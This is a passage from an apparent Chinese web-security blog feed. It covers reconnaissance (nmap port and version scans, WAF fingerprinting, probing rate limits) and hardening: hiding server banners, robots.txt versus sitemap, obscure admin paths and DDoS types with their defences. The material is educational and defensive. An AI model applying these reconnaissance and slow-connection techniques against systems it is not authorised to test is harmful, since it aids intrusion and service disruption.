<p>综上，Web漏洞扫描工具的用法非常简单，输入目标地址、配置相应参数后即可自动化开展扫描。针对Web扫描器的扫描行为，可通过识别http头的server信息进行阻断，或者对各类漏洞测试语句进行过滤。而避免漏洞出现是最根本的方式。</p>
<h1 id="8-分站信息查找"><a href="#8-分站信息查找" class="headerlink" title="8.分站信息查找"></a>8.分站信息查找</h1><p>分站有助于清晰地划分业务逻辑及功能。很多情况下，由于主站访问量很大并且非常重要，运维人员会投入大量精力去管理主站，这在一定程度上会忽视<strong>分站安全</strong>。</p>
<p>在各大互联网公司的SRC（应急响应中心）或漏洞提交平台，可看到其中的绝大部分漏洞均为分站下的漏洞情况。</p>
<p>攻击者在面对对主站渗透攻击过程受阻时，会考虑针对分站的漏洞开展攻击，实现迂回攻击的效果。因此，分站极易成为网站整体安全的短板。</p>
<p>下面是分站寻找方式的总结</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618195351578.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>大量分站由于没有收录而无法被搜索引擎获取。如果需要获取详细信息，可利用各类子域名爆破类等工具进行自动化爆破尝试</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>信息探测</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>信息探测</tag>
      </tags>
  </entry>
  <entry>
    <title>web防护及识别</title>
    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<p>标准的防护方案为从硬件层面利用防火墙封锁高危IP、利用WAF设备在线阻断攻击，或者在Web服务器上开启防火墙、部署相关防护策略等。</p>
<p>大部分防护手段对攻击的防护效果良好，如各类硬件WAF、各类云WAF、服务器防护软件等。</p>
<p>在用户视角下进行防护手段的识别，可更有效地发现当前系统的隐藏威胁。</p>
<h1 id="1-开放端口及对应业务识别"><a href="#1-开放端口及对应业务识别" class="headerlink" title="1.开放端口及对应业务识别"></a>1.开放端口及对应业务识别</h1><p>kali利用nmap对特定ip扫描端口，可以找到一些<strong>open状态的</strong>端口。</p>
<p>遇到一些是<strong>filtered状态</strong>的端口呢，说明是开放的，但成为阻断状态，说明目标主机不仅限于有防火墙，各类防护软件、配置规则等都能形成filtered的效果。</p>
<blockquote>
<p>扫描开放端口的目的在于寻找可与目标服务器交互的点，并且了解目标的具体功能。在进行内网渗透时，这些被防火墙过滤的端口在内网中便可被使用。因此，扫描端口的作用非常多，并可有效扩展攻击目标。</p>
</blockquote>
<h1 id="2-是否有防护类软件"><a href="#2-是否有防护类软件" class="headerlink" title="2.是否有防护类软件"></a>2.是否有防护类软件</h1><p>1）直接<strong>利用错误参数打开目标站点的报错页面</strong>。例如，安全狗、360云防护等会在报错页面留有明确信息或特征。这些特征基本上无法修改，并且部分防护软件还会在报错页面中添加广告信息等，这都算是防护软件的一种标识。</p>
<p>2）<strong>利用NMAP扫描目标站点，查看是否有已开放但被过滤的端口</strong>。如存在这样的端口，基本上可判定服务器前面会有防火墙。如果端口被防火墙过滤，那么此端口在外部无法直接利用。但事无绝对，假设内网数据库服务器开放3306端口并在防火墙处被过滤，则攻击者如果对此网络中任意一台设备成功渗透，就可以在内网利用3306端口开展连接等。</p>
<p>3）<strong>利用Burpsuite抓取与目标系统通信的响应包，观察HTTP包头的server参数，看是否有WAF相关标识。</strong></p>
<p>4）<strong>利用目录爆破工具，并从低速逐步升到高速，查看哪些阶段被封锁</strong>。一个没有添加防护设备或防护策略的站点并不会阻拦来自互联网的访问行为。设置安全设备或安全策略时都会考虑针对DDoS攻击的防护，会对来自同一地址的访问频率进行限制。因此<strong>逐步提升访问效率，即可测试出目标站点的阈值</strong>。可利用工具进行测试，</p>
<h2 id="防护总结"><a href="#防护总结" class="headerlink" title="防护总结"></a>防护总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618200336378.png"></p>
<blockquote>
<p>搜索结果的 “banner” 是指在网络设备（如服务器、路由器、摄像头等）的响应中返回的特定信息。这些信息通常包含了设备的详细描述、设备型号、软件版本、协议信息等。通过分析设备返回的 banner 信息</p>
</blockquote>
<h1 id="3-常用防护方案"><a href="#3-常用防护方案" class="headerlink" title="3.常用防护方案"></a>3.常用防护方案</h1><p>在设计整体防护方案时，大多数人的直观想法是尽可能消灭漏洞。</p>
<p>但在实际安全防护工作中，由于Web开发人员对安全的理解不足、运维人员的安全技术能力稍弱等因素，均会造成无法在第一时间发现漏洞并将其消除。</p>
<p>漏洞会随着攻防技术发展不断涌现，而且公司的渗透测试和代码审计服务价格不菲。因此，在设计方案时，必须考虑“适度防护”。</p>
<p>适度防护的原则是：<strong>建立防护手段，使攻击者的攻击代价（时间成本等）大于攻击成功后的价值</strong>，这样可使攻击者主动放弃攻击目标，从而达到较好的防护效果。</p>
<h2 id="1-整体防护思路"><a href="#1-整体防护思路" class="headerlink" title="1.整体防护思路"></a>1.整体防护思路</h2><p>考虑整体方式思路时，最优的手段并不是增加大量防护工具或软件，而是先识别攻击者能连接过来的路径及攻击者可看到的信息。</p>
<p>从攻击者的角度考虑，如果要针对一个系统开展攻击，必须先识别攻击目标的基本特征。对于Web网站来说，其基本特征包含以下几项：</p>
<blockquote>
<p>·目标的端口号（确认攻击目标有哪些）。</p>
<p>·目标中间件及服务的版本（针对版本寻找可用漏洞）。</p>
<p>·目标是否有明显漏洞等信息。</p>
</blockquote>
<p>可见，在防护阶段应尽可能减少有效信息的暴露，这样会极大增加攻击者的攻击难度，明显提升网站的防护效果。</p>
<h2 id="2-简单防护方案"><a href="#2-简单防护方案" class="headerlink" title="2.简单防护方案"></a>2.简单防护方案</h2><p>中小Web站点的管理人员技术实力有限，无法做到从Web网站代码层面发现漏洞并进行防护。因此，作为中小站点的管理人员，应首先考虑降低当前站点对外提供服务时可被获取有效信息的可能性，并且及时地停用高危服务或端口。再利用漏扫工具扫一遍，查漏补缺。</p>
<h3 id="1-关闭或修改服务器开放端口"><a href="#1-关闭或修改服务器开放端口" class="headerlink" title="1.关闭或修改服务器开放端口"></a>1.关闭或修改服务器开放端口</h3><p>Web服务器会利用HTTP（TCP80）、HTTPS（TCP443）协议为用户提供Web访问服务。</p>
<p>除了有特殊端口提供服务，非必要开放端口尽量关闭，如FTP（21）、SSH（22）等。</p>
<p>如果涉及特殊业务系统必须要<strong>开启特殊端口，建议采用防火墙、iptables等限制非业务端口的连接IP地址</strong>，即利用<strong>白名单技术实现访问控制</strong>，从而尽可能减少外部链接通道。</p>
<p>针对特殊Web应用环境，如单一IP要实现多个Web应用共存，由于每个Web应用均需要一个独立的TCP端口，因此在这个过程中会涉及非默认端口的情况。针对这种情况，建议将端口设置成为<strong>非常见的端口</strong>。这样，NMAP在利用默认参数进行扫描时就不会发现修改过的端口，也就能避免特定应用被攻击者发现。需要注意的是，如果修改了http&#x2F;https的默认端口，那么后续在访问站点时需要在域名后面添加端口号，如<a href="http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。">http://www.xxx.com:30303。访问时添加端口号会给一般用户带来一定的困扰，**因此推荐在各类在线维护系统或内部系统使用**，并且这类系统通常较为敏感及重要，更建议隐藏端口。</a></p>
<p>以常见的端口扫描工具NMAP为例，执行如下命令：</p>
<p><code>#nmap -sS 192.168.1.1</code></p>
<p>实现的效果是利用SYN对目标进行半开链接扫描。在执行上述命令时，NMAP默认扫描端口是：1～1024端口及NMAP中nmap-services（nmap主目录里面）文件里的端口列表。</p>
<p>如果配置文件不设置的话，就是默认配置。</p>
<p>当然了，如果没发现目标端口</p>
<p><code>nmap -p0-65535 192.168.211.129</code> 扩大端口量即可</p>
<p><strong>全端口扫描</strong>的时间大约是标准扫描时间的20倍左右。在实际场景中，攻击者会大范围开展扫描。<strong>考虑到扫描速度，基本会采用NMAP的默认端口开展扫描</strong>（全端口扫描会显著降低扫描速度）。</p>
<blockquote>
<p><strong>因此，推荐将非HTTP&#x2F;HTTPS默认端口的Web网站（如各类管理后台页面、管理地址等）修改为非NMAP默认端口号，可有效降低被发现的概率。</strong></p>
</blockquote>
<h3 id="2-利用防护类工具"><a href="#2-利用防护类工具" class="headerlink" title="2.利用防护类工具"></a>2.利用防护类工具</h3><p>目前，常用的防护类工具分为软件、硬件两种。其中，<strong>硬件</strong>防护工具价格<strong>较贵</strong>，<strong>软件</strong>防护工具<strong>有免费版</strong>可供选择。由于Web站点的独立性，每个站点均有其独特的应用场景及业务流程，这就要求安全工具在配置完毕后需按照Web站点进行相应的规则配置。安全产品及工具如果配置得当，会产生良好的防护效果，<strong>如果仅采用默认配置，则通常只有事倍功半的结果。</strong></p>
<blockquote>
<p>针对中小用户，在没有独立机房的情况下可考虑利用各类<strong>在线云WAF</strong>进行防护，或者<strong>部署相关软件</strong>（如安全狗均可），这类工具安装简便且防护效果良好，<strong>再配合各类webshell查杀工具</strong>定期对Web目录进行检查，即可有效提升站点的安全性。</p>
</blockquote>
<p>如果Web站点部署在各类云平台上，那么可利用云平台提供的防护类工具开展针对性的安全检查。这类工具的费用及效果均可满足中小企业的需求。例如，阿里云上提供应用安全工具，可按照需求购买，成本非常低。</p>
<p>但需注意的是，<strong>安全产品内置的防护规则在默认状态下并不完全适合各类型Web站点。</strong>这主要是由于站点的架构及功能特点各不相同而导致的。例如，对于一个技术论坛，其中会针对各类代码进行讨论，这是此站点的正常业务行为，但由于大量含有代码的讨论内容会被防护设备识别成攻击，反而带来不便。因此，在防护类工具选择上，是否购买是一个问题，但如何更好地发挥防护类工具及自定义规则设置是另一个需要考虑的因素。</p>
<h3 id="3-采用成熟的CMS系统"><a href="#3-采用成熟的CMS系统" class="headerlink" title="3.采用成熟的CMS系统"></a>3.采用成熟的CMS系统</h3><p>成熟的CMS在整体防护策略及安全性方面更加完善。</p>
<p>有针对各类基础漏洞的防护方法、针对用户传参的参数化查询或者转义架构等。</p>
<p>当然了，一般格式高度统一，对用户个性化有影响。目前主流的CMS已具备良好的二次开发能力了。</p>
<h2 id="3-提升安全性的基础手段"><a href="#3-提升安全性的基础手段" class="headerlink" title="3.提升安全性的基础手段"></a>3.提升安全性的基础手段</h2><p>从技术原理上说，仅通过防护类软件，并不一定能完全实现漏洞防护，更不能实现业务层面的逻辑漏洞的防护。因此，最佳手段是在服务器层面提升防护效果等。在了解漏洞的原理之后思考，是否可以<strong>从开始就对漏洞的痕迹进行隐藏</strong>、从开始就对漏洞进行<strong>掩饰</strong>，以<strong>提升攻击者的攻击成本</strong>。</p>
<h3 id="1-隐藏Web服务器的banner"><a href="#1-隐藏Web服务器的banner" class="headerlink" title="1.隐藏Web服务器的banner"></a>1.隐藏Web服务器的banner</h3><p>在各类应用中，常用<strong>banner信息</strong>来表示<strong>某项中间件或操作系统的特征，其中包含类型（Apache、Tomcat、nginx等）、版本号等信息</strong>。这些信息在渗透测试中非常有价值，主要体现在在特定中间件或操作系统版本上会存在各类已知的高危漏洞。当攻击者获取其对应的版本信息之后，可根据版本信息寻找有效的攻击方式。</p>
<p>查看banner信息的好处在于，可以根据对应的版本信息寻找其对应的版本漏洞，常见的有以下几种：</p>
<p><strong>·Apache：存在解析漏洞，range畸形包可导致DDoS攻击。</strong></p>
<p><strong>·PHP：5.3.4版本之前存在%00截断。</strong></p>
<p>攻击者获得目标服务器的banner信息方式为：</p>
<blockquote>
<p>1.利用NMAP进行扫描</p>
<p><code>nmap –sV –Pn &#39;target IP&#39;</code></p>
</blockquote>
<blockquote>
<p>2.利用非正常页面查看banner信息</p>
<p>中间件的默认页面在没有修改的情况下，其返回的页面中会包含对应的banner信息。以常见的404页面为例，利用错误路径触发目标站点显示404页面，就可看到其中的服务器banner。</p>
</blockquote>
<blockquote>
<p>3.抓取服务器response包一样会有服务器信息</p>
<p>见bp抓的响应包中的server。</p>
</blockquote>
<p>目前各类浏览器及Web应用并不需要知道服务器的banner信息，因此可考虑将其关闭或删除。</p>
<p>几个中间件的banner修改方案如下：</p>
<h4 id="（l）修改Apache-banner"><a href="#（l）修改Apache-banner" class="headerlink" title="（l）修改Apache banner"></a>（l）修改Apache banner</h4><blockquote>
<p>关闭版本号显示的方法如下：</p>
<p>1）找到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf或&#x2F;etc&#x2F;apache2&#x2F;httpd.conf（根据相应的Linux发行版选择）。</p>
<p>2）找到项目，将ServerSignature on改为ServerSignature off。</p>
<p>3）找到项目，将ServerTokens Full改为ServerTokens prod。</p>
</blockquote>
<p>以上两项均需修改，如果部分Apache版本的配置文件中没有上述配置，那么直接在http.conf中添加上述两行配置即可。</p>
<p>修改完成之后重新进行检查。先利用Burpsuite抓包，可发现在response中已不显示版本情况。</p>
<p>如果要替换banner名称为专有，可编辑<strong>ap_release.h文件</strong>，方法如下：修改<code>&quot;#define AP_SERVER_BASEPRODUCT&quot;Apache&quot;&quot;为&quot;#define AP_SERVER_BASEPRODUCT&quot;Microsoft-IIS/7.0&quot;</code>。这是一种欺骗的方法，能有效迷惑攻击者。毕竟Apache中怎么也不会存在IIS的漏洞，如果攻击者根据修改后的banner进行大量攻击尝试，也不会产生任何安全威胁。</p>
<h4 id="（2）PHP版本号关闭"><a href="#（2）PHP版本号关闭" class="headerlink" title="（2）PHP版本号关闭"></a>（2）PHP版本号关闭</h4><blockquote>
<p>关闭PHP版本号的方法为打开php.ini配置文件，找到expose_php On项目，将其修改为expose_php off即可。</p>
<p>修改完毕后可重新抓取response包，发现X-Powered-By中的PHP版本号已消失，</p>
</blockquote>
<h4 id="（3）修改Nginx-Banner"><a href="#（3）修改Nginx-Banner" class="headerlink" title="（3）修改Nginx Banner"></a>（3）修改Nginx Banner</h4><blockquote>
<p>修改Nginx配置中的相关项目，方法与Apache的方式类似。修改Server_tokens的值为off。修改后的效果类似Apache。</p>
</blockquote>
<h4 id="（4）修改系统默认TTL"><a href="#（4）修改系统默认TTL" class="headerlink" title="（4）修改系统默认TTL"></a>（4）修改系统默认TTL</h4><p>用以下命令修改Red Hat Linux的TTL基数为128（默认为64）：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;echo 128 &gt; /proc/sys/net/ipv4/ip_default_ttl</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;net.ipv4.ip_default_ttl = 128</span><br></pre></td></tr></table></figure>
</blockquote>
<p>修改版本号只是提高了攻击者的攻击时间成本，有效的防护措施依然是对现有漏洞进行发现和处理。不过由于攻击时间长，可为系统管理员争取一段发现时间，因此定期观察系统日志或利用各类防护系统观察攻击行为，也可尽早发现攻击者并采取后续处理措施。</p>
<h3 id="2-robots-txt"><a href="#2-robots-txt" class="headerlink" title="2.robots.txt"></a>2.robots.txt</h3><p>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除协议”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取、哪些页面不能抓取。</p>
<blockquote>
<p>当一个搜索引擎的爬虫访问站点时，它会首先检查该站点的根目录下是否存在robots.txt，如果该文件存在，搜索机器人就会按照该文件中的内容来确定访问的范围；<strong>如果该文件不存在</strong>，所有的搜索引擎的爬虫将能够访问网站上所有没有被口令保护的页面。因此建议，<strong>仅当网站包含不希望被搜索引擎收录的内容时，才使用robots.txt文件</strong>；如果希望搜索引擎收录网站上所有内容，则不要建立robots.txt文件。</p>
</blockquote>
<p>使用robots.txt的好处在于，可清晰告知搜索引擎的爬虫哪些页面不能被收录，哪些页面可以被收录，从而避免敏感文件被访问。但是，robots.txt本身可以公开访问（搜索引擎的爬虫为公开环境），攻击者只需观察robots.txt里面的内容，也可能发现有效的内容。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222437042.png" alt="robots.txt文件样例"></p>
<p>利用disallow的方式可理解为黑名单的方式，甚至可以直接告知攻击者，哪些连接我是不想让搜索引擎收录的。</p>
<p>为了解决这个问题，建议将传统的robots.txt替换为sitemap。目前主流搜索引擎均支持sitemap。sitemap也叫做网站XML地图，用以格式化地标注网站的整体结构。</p>
<p>例如，百度支持三种sitemap格式：txt文本格式、xml格式、sitemap索引格式。目前常用的为xml格式。</p>
<p>以上海移动网上营业厅（<a href="http://www.sh.10086.cn)为例,其主目录下的robots.txt/">www.sh.10086.cn）为例，其主目录下的robots.txt</a></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618222651935.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent：*</span><br><span class="line">Disallow：</span><br></pre></td></tr></table></figure>

<p>表示允许一切搜索引擎的爬虫爬取网站信息。</p>
<p>接下来，用sitemap告知搜索引擎，该站的网站地图连接在哪里，直接读取此xml文件即可获得网站的结构。</p>
<p><strong>其优点在于利用sitemap告知了搜索引擎爬虫网站可公开的结构有哪些，其余的信息不能被爬取。</strong>这相当于实现了白名单的效果，从而很好地规避了传统写法的缺陷，值得推荐。</p>
<h3 id="3-提升后台地址复杂度"><a href="#3-提升后台地址复杂度" class="headerlink" title="3.提升后台地址复杂度"></a>3.提升后台地址复杂度</h3><p>假设<strong>前台</strong>存在SQL注入漏洞，或者管理员用户及密码已经被攻击者掌握，那么攻击者希望找到目标站点的<strong>后台地址</strong>，以便开展后续攻击。如果后台地址无法被攻击者发现，那么攻击者空有之前成果，无法登录后台开展后续攻击。</p>
<p>攻击者常用的寻找后台地址的方法就是利用搜索引擎，搜索admin相关的字眼，确认是否有后台等。</p>
<p>在大部分情况下，利用搜索引擎并不能直接发现后台，这时攻击者常用的手段就是<strong>地址爆破</strong>。地址爆破的方法是拼接URL，URL由当前“域名+常用后台地址库”进行构造，再顺序访问构造后的URL是否存在，从而对目标网站的后台地址进行爆破。目录爆破类工具是利用<strong>已经定义的后台地址库进行重复尝试</strong>，并对成功返回的地址进行尝试，从而发现后台地址。</p>
<p>作为网站所有者，<strong>基本的手段为加强后台地址复杂度</strong>，避免后台地址出现在攻击者的后台地址库中。常见的后台地址设计方案如下：</p>
<blockquote>
<p>1）将几组方便记忆的信息转换为MD5（可加SALT），再反序等；或者利用其他方式加强难度。方案可自行设计。这样做可显著提高攻击者爆破后台目录的时间成本。</p>
<p>2）还有一种情况在一些早期网站中经常出现：即在前台页面中有一项进入后台管理的功能，这会直接导致当前站点的后台地址暴露。这也就是搜索引擎会将后台地址进行收录的原因。</p>
</blockquote>
<h2 id="4-DDoS攻击及防护方法"><a href="#4-DDoS攻击及防护方法" class="headerlink" title="4.DDoS攻击及防护方法"></a>4.DDoS攻击及防护方法</h2><p>分布式拒绝服务（Distributed Denial of Service，DDoS）攻击指利用<strong>多个节点</strong>，<strong>通过各类协议对目标发动大量链接或大流量行为</strong>，导致目标由于性能及带宽原因，无法有效处理来自攻击节点的各类访问请求，最终实现服务终止的情况。</p>
<p>DDoS攻击无法造成服务器权限或数据的丢失，但会造成Web服务停止运行。</p>
<h3 id="1-DDos主要攻击方式"><a href="#1-DDos主要攻击方式" class="headerlink" title="1.DDos主要攻击方式"></a>1.DDos主要攻击方式</h3><h4 id="1-传输层洪泛攻击"><a href="#1-传输层洪泛攻击" class="headerlink" title="1.传输层洪泛攻击"></a>1.传输层洪泛攻击</h4><p>自建的网站通常要租赁运营商带宽提供Web服务。在这种情况下，由于<strong>带宽有限</strong>，一旦出现DDoS攻击，就算在本地部署了抗DDoS攻击设备且防护效果非常好，也无法恢复正常的Web应用。</p>
<p>这主要由于防护设备部署在Web服务器前端，但是运营商侧的链路早已被DDoS所<strong>阻塞</strong>死，导致正常流量一直无法达到Web服务器。</p>
<blockquote>
<p>就是说运营商分配的正常流量20mb&#x2F;s带宽，而，ddos的攻击流量就有200mb&#x2F;s，这就造成了堵塞</p>
</blockquote>
<h4 id="2-针对Web的应用层攻击"><a href="#2-针对Web的应用层攻击" class="headerlink" title="2.针对Web的应用层攻击"></a>2.针对Web的应用层攻击</h4><p>针对HTTP应用层面的攻击比较复杂，主要体现在危害性及其目标特点上。</p>
<p>常见的DDoS攻击为<strong>CC攻击</strong>，其原理是利用代理服务器或肉鸡节点向Web服务器发起大量请求，造成服务器资源耗尽，达到服务终止的效果。相同类型的攻击还有HTTP GET FLOOG等。</p>
<blockquote>
<p>CC攻击（Challenge Collapsar，挑战黑洞）</p>
</blockquote>
<p>CC攻击原理是利用代理服务器的强大性能，同时针对单一目标发起大量的请求连接，造成目标系统短时间之内无法处理过多的连接数，进而失去响应。</p>
<p>相对于4层的SYN&#x2F;ICMP等占用带宽的DDoS攻击而言，CC攻击主要是为了占用<strong>服务器的连接资源</strong>。虽然占用目的不同，但实现效果一样。在很多场景下，CC攻击常<strong>通过消耗目标服务器的性能</strong>来实现拒绝服务的效果。</p>
<p>总之，<strong>针对Web的应用层攻击就是利用大量请求来消耗目标服务器的硬件资源，实现拒绝服务的目的。</strong>针对这类攻击，通过各类<strong>云WAF或者CDN</strong>可有效解决。</p>
<h4 id="3-慢速连接攻击"><a href="#3-慢速连接攻击" class="headerlink" title="3.慢速连接攻击"></a>3.慢速连接攻击</h4><p>利用HTTP协议缺陷，伪造缺陷请求包，造成目标服务器中间件针对缺陷包的处理异常，从而实现服务器拒绝的效果，这类利用协议缺陷实现的攻击就叫做慢速连接攻击。</p>
<p>特点是利用极低带宽即可实现DDoS攻击效果，相对于CC&#x2F;HTTP get flood攻击来说，其带宽占用极小。</p>
<p>这种攻击主要有以下几种形式：</p>
<blockquote>
<p>（1）Slowloris攻击</p>
<p>HTTP协议规定，HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束。</p>
<p>攻击者在HTTP请求头中将Connection设置为Keep-Alive，要求Web服务器保持TCP连接不要断开，随后缓慢地每隔几分钟发送一个key-value格式的数据到服务器端，如a：b\r\n，导致服务器端认为HTTP头部没有接收完成而一直等待。</p>
<p>如果攻击者使用多线程或者多节点来做同样的操作，<strong>服务器的Web的连接数量很快就被攻击者占满</strong>，导致无法接受新的TCP连接请求。</p>
<p>kali自带一个slowhttptest工具</p>
</blockquote>
<p>正常http包结尾都是\r\n\r\n（0d0a0d0a），如果有一个包结尾是\r\n，也就是少了一组\r\n，会导致低版本中间件在接收到HTTP畸形包之后会一直保持连接打开的状态，进而实现链接占用，达到DDoS攻击的效果。</p>
<blockquote>
<p>（2）Slow HTTP POST</p>
<p>为slowloris攻击的变种形式，利用POST的方式开展攻击。</p>
<p>其核心思路是利用POST包允许在HTTP的头中声明content-length（POST包内容长度）的特点。具体原理为：在提交了相应的HTTP头以后，<strong>不发送HTTP包的body部分</strong>，导致服务器在<strong>接受了POST长度声明</strong>后会持续等待客户端发送POST的内容。假设攻击者保持连接并且以每隔10～100S一个字节的速度去发送，从而达到消耗Web服务器连接资源的效果。因此，不断地增加这样的链接，就会使得服务器的资源被消耗，最后导致拒绝服务的效果。</p>
</blockquote>
<blockquote>
<p>（3）Slow Read Attack</p>
<p>原理为通过<strong>调整TCP协议中的滑动窗口大小</strong>来对服务器单次发送的数据大小进行控制，使得服务器要<strong>将一个回应分成很多个包发送</strong>。要使这种攻击效果更加明显，请求的资源应尽量大。</p>
</blockquote>
<p>总体来说，DDoS攻击的简单、暴力特性，导致即使在服务器端添加抗DDoS类设备<strong>也无法阻止各类带宽占用</strong>的情况。但是，可以根据业务特定适当调优，<strong>提升中间件版本</strong>，避免Web应用层攻击和各类慢速连接攻击带来的危害。目前大部分<strong>运营商或者IDC均提供在线的DDoS攻击流量清洗服务</strong>，防护效果良好，可根据实际情况选用。</p>
<h4 id="4-反射型DDoS攻击"><a href="#4-反射型DDoS攻击" class="headerlink" title="4.反射型DDoS攻击"></a>4.反射型DDoS攻击</h4><p>(Distributed Reflection Denial of Service，DRDOS)的主要特点是利用互联网公共服务（如DNS、NTP等）实现。</p>
<p>攻击者将要<strong>攻击的目标伪造成查询发起方</strong>，<strong>并发送给这些公共服务</strong>。公共服务接收到请求包后，将查询结果返回到被攻击目标上。因此在大量伪造请求发起后，被攻击方会接收到大量的查询结果，导致链路严重阻塞，产生拒绝服务的效果。</p>
<p>反射型DDoS攻击的特点在于可利用<strong>非常小的流量</strong>实现针对目标的<strong>超大流量DDoS攻击</strong>，因此，其<strong>攻击成本非常低</strong>，且带宽阻塞效果显著。由于攻击流量的实际发起方为互联网公共服务，且带宽阻塞无法通过本地的设备进行防护（主要是由于运营商侧的带宽已经占满），其危害也非常严重。目前基于DNS服务、NTP服务、Web服务等都能实现这类效果。从被攻击端观察攻击特点，会发现这非常类似于传输层的DDoS攻击。</p>
<p>反射型DDoS攻击实施简单，效果良好，且对攻击方的带宽占用非常低，因此使用频率非常高。作为防御者，<strong>针对带宽占用</strong>，解决方案是利用运营商链路的<strong>流量清洗</strong>或者各类云平台的清洗服务。仅在系统前端部署防护类攻击基本无效果，这一点需要注意。</p>
<h4 id="5-如何解决DDoS攻击问题"><a href="#5-如何解决DDoS攻击问题" class="headerlink" title="5.如何解决DDoS攻击问题"></a>5.如何解决DDoS攻击问题</h4><p>为DDoS虽然不会对服务器的权限产生影响，但DDoS攻击直接会导致Web服务器失效，也就是业务停用，这对Web服务的可靠性造成极大影响，特别是会影响客户对网站的信任。因此，DDoS这种暴力破坏业务可用性的攻击手段因其简单粗暴性决定了其流行程度。</p>
<p>主要是<strong>利用TCP协议实现大量的链接</strong>，或者利用HTTP应用等实现GET FLOOD、CC攻击等。从攻击原理上说，可利用SYN、ACK、FIN三种TCP的协议规范进行DDoS攻击。</p>
<p>在防护DDoS攻击方面，标准的防护方式就是<strong>统计来自同一目标的请求频率及特点</strong>，并根据业务特点<strong>设定阈值</strong>。比如针对<strong>同一IP</strong>，每秒监测的SYN包阈值可设定为8000，那么当SYN包超过8000时，就将其丢弃，具体丢弃方法根据业务特点而定。比如，全部丢弃可实现针对单一IP的一段时间禁封；也可对超过阈值的部分进行丢弃，只允许阈值内的包通过。</p>
<p>这里有一个问题需要说明。在判断DDoS的危害方面，<strong>最为科学的指标为pps数（即每秒接收处理数据包数）</strong>，<strong>其次才是DDoS流量大小</strong>。因为在DDoS攻击中，若带宽相同，攻击者发送的攻击数据包越小，则对应单位流量下的数据包越多，即pps数越高时。由于各类设备针对数据包处理也有阈值，因此相应的防护系统处理DDoS攻击的难度就会越大。因此，常用的以Mbps来表示的DDoS攻击量，有时并不能客观体现DDoS攻击的强度。</p>
<p><strong>在DDoS攻击防护方面，目前的抗拒绝服务攻击设备都能针对上述DDoS攻击提供较好的防护效果。</strong>运营商在其主干链路中也部署了大量的旁路抗拒绝服务攻击设备。运营商旁路部署抗拒绝服务攻击设备原理是利用动态路由协议特性实现的效果，将牵引设备添加到当前BGP路由表中。当牵引设备发现当前链路中出现DDoS攻击行为时，会通过将当前链路通过更新动态路由表的方式将流量牵引至抗DDoS设备，并在对DDoS攻击流量进行清洗后将正常流量汇注到当前网络内。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619152154089.png" alt="抗DDoS系统旁路部署图"></p>
<p><strong>在旁路部署时，如果出现DDoS攻击流量，防护设备对DDoS流量会进行自动牵引和清洗。</strong>这样做的好处在于整体过程对现有的传输不造成影响。由于在正常情况下流量不经过抗DDoS设备，因此不会对当前业务造成延迟，因而广泛用于各级运营商、各级骨干链路等。针对普通用户而言，旁路部署的意义不大，建议通过接口串联或者利用运营商或IDC提供的DDoS攻击清洗服务进行防御。</p>
<p>总体来说，DDoS攻击的技术简单、粗暴，其目的在于破坏目标网站的业务可用性。虽然无法获得目标服务器的权限及数据，但是随着目前互联网在线应用的日益增多及用户针对Web系统的依赖性增强，导致DDoS的效果反而非常良好。目前国内各大云服务提供商或链路提供商均已提供<strong>在线防护或清洗服务</strong>，因此从防护角度来说不必太担心。但这种攻击行为始终会影响系统的正常工作，在未来，各类DrDos等攻击行为及技术仍然还会存在较长时间。</p>
<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h1><p>攻击者在针对一个<strong>Web系统开展攻击</strong>时，必须知道<strong>目标的基本信息及可通行的路径</strong>，否则就是在进行大量无意义的尝试。因些，从<strong>防御角度</strong>，建议利用各类<strong>Web扫描器配合人工检查</strong>，对现有业务系统进行全面的安全测试，</p>
<p>总体来说，中小站点在安全防护的提升阶段可采用以下思路：</p>
<p>1）<strong>隐藏站点的敏感信息，如各类端口、各类目录等</strong>。同时，利用各类搜索引擎在互联网上搜索站点的内容，尝试发现有价值的内容，并进行针对性处理。</p>
<p>2）<strong>检查业务体系安全状况，隐藏后台地址，提升管理用户的密码强度或者限制登录范围等。</strong>同时，根据第二部分介绍的业务安全体系流程进行业务安全分析。</p>
<p>3）<strong>利用各类Web扫描器对站点进行漏洞扫描，并根据扫描结果进行定向漏洞修复或功能加固。</strong>针对无法扫描的漏洞，建议根据第一部分的漏洞防护原理进行手工测试，实现针对站点的基础漏洞加固。</p>
<p>4）在完成上述流程之后，<strong>推荐采用各类Web防护设备来构建安全防护体系。</strong>以上三步在测试过程中如果有防护设备，会对安全检查效果造成干扰，因此推荐最后部署。部署时需要详细调整防护设备的规则，以适应站点的特性。</p>
<p><strong>适度安全防护</strong>是安全防护策略中必须要考虑的因素，如何平衡安全防护投入与产出比非常关键。最后，要整体提升站点安全，避免出现木桶效应，方可实现针对系统的有效运行保障。</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>防护识别</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>防护识别</tag>
      </tags>
  </entry>
  <entry>
    <title>系统日志</title>
